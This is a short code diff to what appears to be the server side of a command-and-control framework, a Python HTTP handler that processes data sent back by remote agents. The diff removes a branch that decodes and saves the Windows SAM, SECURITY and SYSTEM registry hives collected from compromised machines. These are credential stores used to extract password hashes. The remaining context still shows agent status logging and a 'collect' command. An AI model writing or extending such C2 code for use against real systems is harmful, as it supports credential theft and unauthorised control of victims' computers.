@@ -83,17 +83,6 @@ class C2(BaseHTTPRequestHandler):
             if 'status' in agent_data['data']:
                 utils.log_message(f"[*] status: {agent_data['data']['status']}", print_time=False)
 
-        elif command_type == "sam" and agent_data["data"]["is_success"] == "true":
-            save_path = os.path.join(collect_folder, agent, "sam_{}".format(datetime.now().strftime(file_save_strftime)))
-            sam_path = os.path.join(save_path, "sam")
-            sec_path = os.path.join(save_path, "security")
-            sys_path = os.path.join(save_path, "system")
-            if utils.write_file(sam_path, utils.decode_base_64(agent_data["data"]["sam_base64"], encoding="utf-8")) and \
-                    utils.write_file(sec_path, utils.decode_base_64(agent_data["data"]["sec_base64"], encoding="utf-8")) and \
-                    utils.write_file(sys_path, utils.decode_base_64(agent_data["data"]["sys_base64"], encoding="utf-8")):
-                utils.log_message(f"Downloaded sam,security,system hives from agent {agent}")
-                utils.log_message(f"[+] saved in: {save_path}", print_time=False)
-
         elif command_type == "collect":
             # agent exists
             try: 
